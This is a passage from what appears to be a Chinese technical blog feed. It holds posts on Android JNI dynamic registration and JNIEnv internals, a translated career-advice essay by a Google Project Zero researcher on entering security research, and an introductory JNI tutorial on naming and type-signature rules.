class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -&gt; RegisterNatives(clz, nativeMethod, <span class="keyword">sizeof</span>(nativeMethod) / <span class="keyword">sizeof</span>(nativeMethod[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure></p><h3 id="c和c"><a href="#c和c" class="headerlink" title="c和c++"></a>c和c++</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__cplusplus)</span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span>* <span class="title">JNIEnv</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这是因为在jni.h中，c++的JNIEnv是_JNIEnv,而c的是<code>JNINativeInterface*</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JNIEnv</span> &#123;</span></span><br><span class="line">    <span class="comment">/* do not rename this; it does not seem to be entirely opaque */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span>* <span class="title">functions</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">jint <span class="title">RegisterNatives</span><span class="params">(jclass clazz, <span class="keyword">const</span> JNINativeMethod* methods,</span></span></span><br><span class="line"><span class="function"><span class="params">        jint nMethods)</span></span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;RegisterNatives(<span class="keyword">this</span>, clazz, methods, nMethods); &#125;</span><br></pre></td></tr></table></figure><p>在c++中，实际上调用的是<code>functions-&gt;RegisterNatives(this, clazz, methods, nMethods)</code><br>而functions是<code>JNINativeInterface*</code>类型的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    jint (*RegisterNatives)(JNIEnv*, jclass, <span class="keyword">const</span> JNINativeMethod*,jint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c中,<code>JNIEnv *env</code>,实际上是<code>JNINativeInterface **</code>，这样的NINativeInterface的二级指针。<br>所以<br><code>(*env) -&gt; RegisterNatives(env, clz, nativeMethod, sizeof(nativeMethod) / sizeof(nativeMethod[0]))</code><br>就是先通过解引用得到<code>JNINativeInterface *</code>结构体指针，再通过它调用<br><code>jint (*RegisterNatives)(JNIEnv*, jclass, const JNINativeMethod*,jint);</code><br>这个函数指针来使用函数。</p><p><strong>tip:之所以是函数指针，是因为c中结构体成员中不能有函数</strong></p>]]></content>
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 动态注册 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Google Project Zero 成员教你如何入门搞安全（翻译）</title>
      <link href="/2018/02/07/trans_gp0/"/>
      <url>/2018/02/07/trans_gp0/</url>
      <content type="html"><![CDATA[<p>已经有很多人（包括我谷歌的同事, Parisa 和 Michal 已经就这个话题写过自己的感受, 我建议你仔细阅读.我知道我写的这些可能已经有人说过了, 但是每隔一段时间, 我总是会再次遇到这个问题, 于是我决定写下自己的经验.</p><p>请注意, 我是一个应用安全研究员, 我是从漏洞研究/安全审查/ bug 寻找/黑客攻击等角度来写这篇文章的.在安全领域还有很多其他的道路, 比如安全研发, 恶意软件分析等等, 这些我并不熟悉.</p><p>那么, 我是谁？为什么你要在这个话题上信任我呢？嗯, 首先我不是说你应该完全信任我, 因为每个人的经验和每个人的道路都是有所不同的.但如果您对我感到好奇, 我可以告诉您, 我现在是 Google Project Zero 的成员, 我曾经是谷歌安全团队的成员, 是多个安全工具的作者, 如果你在这个博客上滚动足够长的时间, 你会发现我已经从事安全工作十多年了.</p><p>我认识的安全研究员来自很多不同的背景, 但是我的背景有所不同, 我有相当强的学术背景, 这在我的同行中是非常不典型的, 当然这并不是进入安全领域的要求.然而, 我所知道的安全研究员中的大多数人都有一些共同点, 这里我们来看第一条：</p><h2 id="自己做点东西"><a href="#自己做点东西" class="headerlink" title="自己做点东西"></a>自己做点东西</h2><p>对于我所知道的业内大多数人来说, 在从事相关工作之前, 安全只是一项业余爱好.当然, 如果你只是考虑如何学习安全, 在告诉你如何开始之前, 告诉你自己做点东西并不会有什么帮助.继续阅读, 我会在下面提到如何开始. 但是首先, 还有一件事你应该注意 (不要让它阻碍你, 我们将在后面看到如何解决它)</p><p>现在开始学习安全, 比十年前困难的多</p><p>我怀疑不是每个人都会承认, 但是安全在过去这些年, 确实有了很大提高.是的, 如果你足够深入的话, 你将会发现用十多年前的技术仍然可以运行的软件或者硬件, 例如 Web 浏览器.当我正在研究我的第一个 Windows 漏洞利用（堆溢出）时, 我感到十分沮丧, 因为微软最近引入了新的safe unlink 机制, 所以我读到的一些众所周知的堆漏洞利用技术已经不再有效. 10 年后, 刚开始学习安全的人们不仅需要处理 safe unlink 和 stack cookie , 还需要知道 SafeSEH / SEHOP, DEP, ASLR, CFG, ACG 还有浏览器的 sandbox 等等.并不限于 Web 浏览器, 如果你对比一下十年前和现在的 Web 应用框架, 你会发现在安全技术上已经了显著的不同.</p><p>不要害怕上面这一段文字, 那么你应该如何对付日益陡峭的学习曲线呢?</p><h2 id="利用好学习资源"><a href="#利用好学习资源" class="headerlink" title="利用好学习资源"></a>利用好学习资源</h2><p>一般而言, 刚开始入门的难度比较高, 实际上, 现在的学习资源也比以前要丰富.</p><p>但是另一个警告是: 你需要能够走出去并且自主学习, 没有人会牵着你的手, 或者成为你的导师 (可能总是有厉害的师父来帮助学徒, 但是黑客很少这样做) . 如果你喜欢按照预先设定的课程进行 (就像我承认的我的大部分教育所做的那样) , 那么你可能就不会在安全方面走得太远.</p><p>在获得正确的学习资源之前, 您需要正确地提问. 谷歌搜索 “如何成为黑客” 和类似的问题, 在现在仍然会得到与以前一样的胡说八道. 相反, 请尝试更加细致的问题, 例如:</p><p>我感兴趣的这个软件/硬件是如何工作的？ 它基于什么技术？ 有我可以阅读的源代码？教程? 图书吗？<br>有人已经设法成功破解了我想要破解的这一软件/硬件吗？ 他们发布了 WriteUp 吗？Exp 呢？ 会议介绍呢？ 我真的明白他们是怎么做的了么？<br>由此可见, 你自己必须在技术上相当不错, 以了解由别人制作的真实软件或硬件是如何工作的. 虽然编写代码和阅读代码的技能并不完全相同, 但仍存在相当大的重叠, 所以如果您不习惯写代码, 在进一步深入研究安全之前, 您可能需要改进这一点.</p><p>不要忘记第二点. 虽然之前我对技术性的东西还算是比较好的, 但是直到我开始阅读其他人发布的漏洞研究和 Exp 后, 我才真正理解安全.</p><p>还有另一个警告: 当你遇到你不了解的东西时, 不要放弃. 特别是在刚开始阅读各种资源时, 你遇到的很多问题. 跳过这些部分是简单的方法, 但也是错误的方法. 相反, 想想遇到的每一比特信息都是你不了解的, 把它们作为线索, 想想你还需要学习什么.</p><p>虽然我写到没有人会牵着你的手, 但这并不意味着你不应该提问. 事实上, 你应该自在一点. 人们不会为你而放下自己所做的工作, 但如果你卡住了, 他们可能会给你一个正确的方向.</p><h2 id="使用推特"><a href="#使用推特" class="headerlink" title="使用推特"></a>使用推特</h2><p>拥护一个特定的社交网络看起来很奇怪, 但一个重要事实是很多安全团队都使用 Twitter 来分享新闻, 而且更重要的是那些最近的研究、漏洞、 PoC 、会议演讲和其他类似的链接. 我真的不知道这些是怎么发生的, 也许是短消息的形式让人们更方便地分享资源链接, 而不用受到漫长而不必要的讨论的困扰. 所以, 在 Twitter 上找那些研究或发表你感兴趣东西的人, 然后翻阅他们的推特吧.</p><p>除了 Twitter 以外, 你可以找到有趣资源的其他地方是 r / netsec 和 Hacker News (尽管它除了安全性外还有其他的东西) . 你还可以看看安全会议的演讲和录音 (它们有很多, 但并不都是好的. 重点集中于技术性较强的那些会议) .</p><h2 id="打-CTF-是一种很好的学习方式"><a href="#打-CTF-是一种很好的学习方式" class="headerlink" title="打 CTF 是一种很好的学习方式"></a>打 CTF 是一种很好的学习方式</h2><p>另一个我给你们的奇怪建议是我自己几乎从不玩 CTF , 但是还记得我写的有关难度曲线的内容吗 ? CTF 可以让你的学习经历更加循序渐进, 因为 CTF 的赛题有多种难度级别 (你通常可以通过每个赛题的分数来分辨) , 所以你可以从更简单的开始, 然后从那里开始一点点学习. 举个例子, 在关闭缓解措施之后练习漏洞利用. 知道这儿有一个 bug 或方式来解决它，也是一些安慰.</p><p>几乎每个星期在一个地方都有一个 CTF , 其中大部分都是可以在线解题, 你可以在这里找到时间安排. 如果你不能解决赛题, 不要忘了他人解题的 WriteUp .</p><p>CTF 可以成为一种很有趣的经历, 但当你学会一些东西之后, 别忘了继续研究真实世界的目标, 你可能会感到十分惊喜!</p><h2 id="但是不要害怕失败-哪怕一次又一次"><a href="#但是不要害怕失败-哪怕一次又一次" class="headerlink" title="但是不要害怕失败, 哪怕一次又一次."></a>但是不要害怕失败, 哪怕一次又一次.</h2><p>现在漏洞研究的工作常常是让人十分沮丧的, 大部分你尝试的东西都不会成功, 但你必须接受这一点. 但不要因此而泄气. 这不仅仅是发生在你身上, 对于每一个富有经验的研究员来说也是如此. 我们往往只能看到别人的成功, 却不知道背后的代价. 当你失败的时候, 在继续前进之前一定要弄明白失败的原因.</p><h2 id="你比你想象的更加聪明-反之亦然-其他人并不像你想的那样聪明"><a href="#你比你想象的更加聪明-反之亦然-其他人并不像你想的那样聪明" class="headerlink" title="你比你想象的更加聪明(反之亦然: 其他人并不像你想的那样聪明)."></a>你比你想象的更加聪明(反之亦然: 其他人并不像你想的那样聪明).</h2><p>这可能是一个有争议的观点, 因为其他人提出了 “你不比开发者更聪明” 的建议. 虽然这是真实的, 对于业内很多人来说, 这是一个很好的建议, 但对许多刚刚入门或正在考虑入门的人来说, 这可能是错误的, 事实是, 在看到别的聪明人做什么之后, 如果自己没有在这个领域做任何事情, 就很容易怀疑自己的能力. 让我举个例子: 现在你可能听起来很奇怪, 但是当我开始把安全作为一种爱好时, 我认为我从来没有足够的能力去发现 Windows 中的漏洞。我从来没有尝试过，但是我偶然发现了我的第一个 Windows 漏洞：我 fuzz 了一些蹩脚的图像库，过了一段时间，我有一些崩溃样本. 而当我意外地点击 Windows 中的其中一个崩溃样本时，Windows 资源管理器崩溃了 - 这是 CVE-2008-3013。</p><p>另外一个例子: 在对一个软件进行审查的时候, 你可能会有一个想法, 然后想 “不，这太愚蠢了，开发人员肯定会想到这个”. 事实是, 他们经常没有. 公平地说, 那不是因为他们愚蠢, 那是因为他们当时想到了其他问题, 但是, 如果“我比他们聪明”的思维方式有助于突破你为自己设定的人为限制.</p><p>当你和别人, 特别是开发者交谈的时候, 请记住，他们是代码方面的专家，但是你是安全方面的专家.</p><h2 id="我如何证明自己的能力"><a href="#我如何证明自己的能力" class="headerlink" title="我如何证明自己的能力?"></a>我如何证明自己的能力?</h2><p>可以从赚钱开始: 很多公司都有 bug bounty program: Google, FB, MS, etc</p><p>即使你挖到的漏洞拿不到奖金, 但能帮助到他人, 仍然能够帮助证明你的实力.</p><p>挖漏洞并不是唯一的途径, 开发安全工具, 做防御性的研究, 同样是很有价值的.</p><h2 id="还有什么是我需要知道的"><a href="#还有什么是我需要知道的" class="headerlink" title="还有什么是我需要知道的?"></a>还有什么是我需要知道的?</h2><p>安全研究员的人生可能并不像你想象的那么光鲜亮丽, 为了成为一个大牛, 你需要在电脑面前坐到<strong>天荒地老</strong>. 这是一份有挑战性的工作, 并且需要花费相当大的精力.</p><p>原文地址:<a href="http://ifsec.blogspot.jp/2018/02/so-you-want-to-work-in-security-and-for.html" target="_blank" rel="noopener">http://ifsec.blogspot.jp/2018/02/so-you-want-to-work-in-security-and-for.html</a></p>]]></content>
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Android JNI入门</title>
      <link href="/2018/02/07/jni/"/>
      <url>/2018/02/07/jni/</url>
      <content type="html"><![CDATA[<h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><h2 id="JNI引入"><a href="#JNI引入" class="headerlink" title="JNI引入"></a>JNI引入</h2><ul><li>JNI : Java本地接口,Java Native Interface, 它是一个协议, 该协议用来沟通Java代码和外部的本地C/C++代码, 通过该协议 Java代码可以调用外部的本地代码, 外部的C/C++ 代码可以调用Java代码;</li><li>C和Java的侧重 :<br>C语言 : C语言中最重要的是函数 function;<br>Java语言 : Java中最重要的是 JVM, class类, 以及class中的方法;</li><li>C与Java如何交流 :<br>JNI规范 : C语言与Java语言交流需要一个适配器, 中间件, 即 JNI, JNI提供了一种规范;<br>C语言中调用Java方法 : 可以让我们在C代码中找到Java代码class中的方法, 并且调用该方法;<br>Java语言中调用C语言方法 : 同时也可以在Java代码中, 将一个C语言的方法映射到Java的某个方法上;<br>JNI桥梁作用 : JNI提供了一个桥梁, 打通了C语言和Java语言之间的障碍;</li><li>JNI中的一些概念 :<br>native : Java语言中修饰本地方法的修饰符, 被该修饰符修饰的方法没有方法体;<br>Native方法 : 在Java语言中被native关键字修饰的方法是Native方法;<br>JNI层 : Java声明Native方法的部分;<br>JNI函数 : JNIEnv提供的函数, 这些函数在jni.h中进行定义;<br>JNI方法 : Native方法对应的JNI层实现的 C/C++方法, 即在jni目录中实现的那些C语言代码;<h2 id="JNI在Android中作用"><a href="#JNI在Android中作用" class="headerlink" title="JNI在Android中作用"></a>JNI在Android中作用</h2>JNI可以调用本地代码库(即C/C++代码), 并通过 Dalvik虚拟机 与应用层 和 应用框架层进行交互, Android中JNI代码主要位于应用层 和 应用框架层;<br>应用层 : 该层是由JNI开发, 主要使用标准JNI编程模型;<br>应用框架层 : 使用的是Android中自定义的一套JNI编程模型, 该自定义的JNI编程模型弥补了标准JNI编程模型的不足;<br>JNI是连接框架层 (Framework - C/C++) 和应用框架层(Application Framework - Java)的纽带;<br>Android中JNI源码位置 : 在应用框架层中, 主要的JNI代码位于 framework/base目录下, 这些模块被编译成共享库之后放在 /system/lib 目录下;<br>NDK与JNI区别 : </li><li>NDK: NDK是Google开发的一套开发和编译工具集, 主要用于Android的JNI开发;</li><li>JNI : JNI是一套编程接口, 用来实现Java代码与本地的C/C++代码进行交互;<h2 id="JNI编程步骤"><a href="#JNI编程步骤" class="headerlink" title="JNI编程步骤:"></a>JNI编程步骤:</h2></li></ul><ol><li>声明native方法 : 在Java代码中声明 native method()方法;</li><li>实现JNI的C/C++方法 : 在JNI层实现Java中声明的native方法, 这里使用javah工具生成带方法签名的头文件, 该JNI层的C/C++代码将被编译成动态库;</li><li>加载动态库 : 在Java代码中的静态代码块中加载JNI编译后的动态共享库;</li></ol><h1 id="Android中的应用程序框架"><a href="#Android中的应用程序框架" class="headerlink" title="Android中的应用程序框架"></a>Android中的应用程序框架</h1><h2 id="正常情况下的Android框架"><a href="#正常情况下的Android框架" class="headerlink" title="正常情况下的Android框架"></a>正常情况下的Android框架</h2><p>最顶层是Android的应用程序代码, 上层的应用层 和 应用框架层 主要是Java代码, 中间有一层的Framework框架层代码是 C/C++代码, 通过Framework进行系统调用, 调用底层的库 和linux 内核;<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo82wjl40oj30fd08xmxm.jpg" alt=""></p><h2 id="使用JNI时的Android框架"><a href="#使用JNI时的Android框架" class="headerlink" title="使用JNI时的Android框架"></a>使用JNI时的Android框架</h2><p>绕过Framework提供的调用底层的代码, 直接调用自己写的C代码, 该代码最终会编译成为一个库, 这个库通过JNI提供的一个Stable的ABI 调用linux kernel;ABI是二进制程序接口 application binary interface.<br><img src="https://ws2.sinaimg.cn/large/006tKfTcly1fo82ym8zujj30fe0ait99.jpg" alt=""></p><h1 id="JNI详解"><a href="#JNI详解" class="headerlink" title="JNI详解"></a>JNI详解</h1><h2 id="JNIEnv详解"><a href="#JNIEnv详解" class="headerlink" title="JNIEnv详解"></a>JNIEnv详解</h2><ul><li>JNIEnv作用 : JNIEnv 是一个指针,指向了一组JNI函数, 这些函数可以在jni.h中查询到,通过这些函数可以实现 Java层 与 JNI层的交互 , 通过JNIEnv 调用JNI函数 可以访问java虚拟机, 操作java对象;<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo83l5gywfj30fb0b7myf.jpg" alt=""></li><li><p>JNI线程相关性 : JNIEnv只在当前的线程有效,JNIEnv不能跨线程传递, 相同的Java线程调用本地方法, 所使用的JNIEnv是相同的, 一个Native方法不能被不同的Java线程调用;</p></li><li><p>JNIEnv结构体系 : JNIEnv指针指向一个线程相关的结构,线程相关结构指向一个指针数组,指针数组中的每个元素最终指向一个JNI函数.</p><h3 id="JNIEnv的C-C-声明"><a href="#JNIEnv的C-C-声明" class="headerlink" title="JNIEnv的C/C++声明"></a>JNIEnv的C/C++声明</h3><p><strong>jni.h中声明JNIEnv</strong>:C语言中定义的JNIEnv 是 JNINativeInterface* , C++中定义的JNIEnv 是 _JNIEnv;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JNIEnv</span>;</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JavaVM</span>;</span>  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span>* <span class="title">C_JNIEnv</span>;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__cplusplus)    <span class="comment">//为了兼容C 和 C++两种代码 使用该 宏加以区分  </span></span></span><br><span class="line"><span class="keyword">typedef</span> _JNIEnv JNIEnv;     <span class="comment">//C++ 中的JNIEnv类型  </span></span><br><span class="line"><span class="keyword">typedef</span> _JavaVM JavaVM;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span>* <span class="title">JNIEnv</span>;</span><span class="comment">//C语言中的JNIEnv类型  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span>* <span class="title">JavaVM</span>;</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li></ul><h3 id="C语言中的JNIEnv"><a href="#C语言中的JNIEnv" class="headerlink" title="C语言中的JNIEnv"></a>C语言中的JNIEnv</h3><p>关于JNIEnv指针调用解析 : C中JNIEnv就是 <code>const struct JNINativeInterface*</code>, <code>JNIEnv * env</code> 等价于 <code>JNINativeInterface** env</code>, 因此要得到JNINativeInterface结构体中定义的函数指针, 就必须先获取到 JNINativeInterface的一级指针对象 即 <em>env , 该一级指针对象就是 `JNINativeInterface</em> <code>, 然后通过该一级指针对象调用JNI函数 :</code>(*env)-&gt;NewStringUTF(env, “hello”)`;<br>在JNINativeInterface结构体中定义了一系列的关于Java操作的相关方法 :<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Table of interface function pointers. </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span> &#123;</span>  </span><br><span class="line">    <span class="keyword">void</span>*       reserved0;  </span><br><span class="line">    <span class="keyword">void</span>*       reserved1;  </span><br><span class="line">      </span><br><span class="line">    ... ...  </span><br><span class="line">      </span><br><span class="line">    jboolean    (*CallStaticBooleanMethodV)(JNIEnv*, jclass, jmethodID,  </span><br><span class="line">                        va_list);  </span><br><span class="line">    jboolean    (*CallStaticBooleanMethodA)(JNIEnv*, jclass, jmethodID,  </span><br><span class="line">                        jvalue*);  </span><br><span class="line">    jbyte       (*CallStaticByteMethod)(JNIEnv*, jclass, jmethodID, ...);  </span><br><span class="line">    jbyte       (*CallStaticByteMethodV)(JNIEnv*, jclass, jmethodID, va_list);  </span><br><span class="line">      </span><br><span class="line">    ... ...  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">void</span>*       (*GetDirectBufferAddress)(JNIEnv*, jobject);  </span><br><span class="line">    jlong       (*GetDirectBufferCapacity)(JNIEnv*, jobject);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* added in JNI 1.6 */</span>  </span><br><span class="line">    jobjectRefType (*GetObjectRefType)(JNIEnv*, jobject);  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="C-中的JNIEnv"><a href="#C-中的JNIEnv" class="headerlink" title="C++中的JNIEnv"></a>C++中的JNIEnv</h3><p>C++ 中的JNIEnv: C++ 中的JNIEnv 就是 _JNIEnv 结构体, 二者是等同的; 因此在调用 JNI函数的时候, 只需要使用 env-&gt;NewStringUTF(env, “hello”)方法即可, 不用在进行*运算;<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * C++ object wrapper. </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * This is usually overlaid on a C struct whose first element is a </span></span><br><span class="line"><span class="comment"> * JNINativeInterface*.  We rely somewhat on compiler behavior. </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">JNIEnv</span> &#123;</span>  </span><br><span class="line">    <span class="comment">/* do not rename this; it does not seem to be entirely opaque */</span>  </span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span>* <span class="title">functions</span>;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__cplusplus)  </span></span><br><span class="line">  </span><br><span class="line">    <span class="function">jint <span class="title">GetVersion</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;GetVersion(<span class="keyword">this</span>); &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="function">jlong <span class="title">GetDirectBufferCapacity</span><span class="params">(jobject buf)</span>  </span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;GetDirectBufferCapacity(<span class="keyword">this</span>, buf); &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* added in JNI 1.6 */</span>  </span><br><span class="line">    <span class="function">jobjectRefType <span class="title">GetObjectRefType</span><span class="params">(jobject obj)</span>  </span></span><br><span class="line"><span class="function">    </span>&#123; <span class="keyword">return</span> functions-&gt;GetObjectRefType(<span class="keyword">this</span>, obj); &#125;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/*__cplusplus*/</span>  </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h2 id="JNI方法命名规则-标准JNI规范"><a href="#JNI方法命名规则-标准JNI规范" class="headerlink" title="JNI方法命名规则(标准JNI规范)"></a>JNI方法命名规则(标准JNI规范)</h2><p>JNI实现的方法 与 Java中Native方法的映射关系 : 使用方法名进行映射,可以使用 javah 工具进入 bin/classes 目录下执行命令, 即可生成头文件;<br>例如<br>java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jni.demo;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNIDemo</span> </span>&#123;</span><br><span class="line"><span class="comment">//定义一个本地方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="comment">//调用动态链接库</span></span><br><span class="line">System.loadLibrary(<span class="string">"JNIDemo"</span>);</span><br><span class="line">JNIDemo jniDemo = <span class="keyword">new</span> JNIDemo();</span><br><span class="line">jniDemo.sayHello();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>c++<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_jni_demo_JNIDemo.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_com_jni_demo_JNIDemo_sayHello</span> <span class="params">(JNIEnv * env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Hello World"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>JNI方法参数介绍: </p><ul><li>参数① : 第一个参数是JNI接口指针 JNIEnv;</li><li>参数② : 如果Native方法是非静态的, 那么第二个参数就是对Java对象的引用, 如果Native方法是静态的, 那么第二个参数就是对Java类的Class对象的引用;</li></ul><p>JNI方法名规范 : 返回值 + Java前缀 + 全路径类名 + 方法名 + 参数① JNIEnv + 参数② jobject + 其它参数;<br><em>注意分隔符 : Java前缀 与 类名 以及类名之间的包名 和 方法名之间 使用 “_” 进行分割;</em></p><p>声明<strong>非静态</strong>方法: </p><ul><li>Native方法 : public int hello (String str, int i); </li><li>JNI方法: jint Java_shuliang_han_Hello_hello(JNIEnv * env, jobject obj, jstring str, jint i);</li></ul><p>声明<strong>静态</strong>方法 : </p><ul><li>Native方法 : public static int hello (String str, int i); </li><li>JNI方法 : jint Java_shuliang_han_Hello_hello(JNIEnv * env, jobject clazz, jstring str, jint i);</li></ul><p>两种规范 : 以上是Java的标准JNI规范, 在Android中还有一套自定义的规范, 该规范是Android应用框架层 和 框架层交互使用的JNI规范, 依靠方法注册 映射 Native方法 和 JNI方法;</p><h2 id="JNI方法签名规则"><a href="#JNI方法签名规则" class="headerlink" title="JNI方法签名规则"></a>JNI方法签名规则</h2><p>JNI识别Java方法 : JNI依靠函数名 和 方法签名 识别方法, 函数名是不能唯一识别一个方法的, 因为方法可以重载, 类型签名代表了 参数 和 返回值;</p><ul><li><p>签名规则 : (参数1类型签名 参数2类型签名 参数3类型签名 参数N类型签名…) 返回值类型签名<br><strong>注意参数列表中没有任何间隔</strong>;</p></li><li><p>Java类型 与 类型签名对照表 : 注意 boolean 与 long 不是大写首字母, 分别是 Z 与 J,  类是L全限定类名, 数组是[元素类型签名;</p></li><li>类的签名规则 :L + 全限定名 + ;三部分, 全限定类名以 / 分割;</li></ul><p>Java类型    类型签名<br>boolean Z<br>byte    B<br>char    C<br>short    S<br>int    I<br>long    J<br>float    F<br>double    D<br>类    L全限定类名;<br>数组    [元素类型签名<br>eg. long function(int n, String str, int[] arr);<br>该方法的签名 :(ILjava/lang/String;[I)J</p><p>方法签名介绍 :<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 